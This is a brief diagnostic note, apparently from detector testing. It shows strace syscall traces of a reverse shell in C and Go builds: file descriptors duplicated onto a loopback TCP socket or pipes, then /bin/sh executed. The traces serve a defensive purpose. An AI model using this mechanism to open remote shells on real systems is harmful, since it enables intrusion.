# Supplemental reverse-shell syscall diagnostic

Captured after qualification with strace attached. These are mechanism diagnostics,
not unchanged-detector qualification runs. Full traces are in the private archive.

## linux-c-glibc

```text
dup2(3<TCP:[127.0.0.1:51898->127.0.0.1:4444]>, 0</dev/null<char 1:3>>) = 0<TCP:[127.0.0.1:51898->127.0.0.1:4444]>
dup2(3<TCP:[127.0.0.1:51898->127.0.0.1:4444]>, 1<pipe:[330155]>) = 1<TCP:[127.0.0.1:51898->127.0.0.1:4444]>
dup2(3<TCP:[127.0.0.1:51898->127.0.0.1:4444]>, 2<pipe:[330156]>) = 2<TCP:[127.0.0.1:51898->127.0.0.1:4444]>
execve("/bin/sh", ["sh"], 0x7ffca984d4d8 /* 4 vars */) = 0
```

## linux-go-cgo

```text
dup3(8<pipe:[330279]>, 0</dev/null<char 1:3>>, 0) = 0<pipe:[330279]>
dup3(11<pipe:[330280]>, 1<pipe:[329389]>, 0) = 1<pipe:[330280]>
dup3(11<pipe:[330280]>, 2<pipe:[329390]>, 0) = 2<pipe:[330280]>
execve("/bin/sh", ["sh"], 0xc0000a2840 /* 4 vars */) = 0
```

## linux-go-static

```text
dup3(8<pipe:[331935]>, 0</dev/null<char 1:3>>, 0) = 0<pipe:[331935]>
dup3(11<pipe:[331936]>, 1<pipe:[329510]>, 0) = 1<pipe:[331936]>
dup3(11<pipe:[331936]>, 2<pipe:[329511]>, 0) = 2<pipe:[331936]>
execve("/bin/sh", ["sh"], 0xc0001840c0 /* 4 vars */) = 0
```
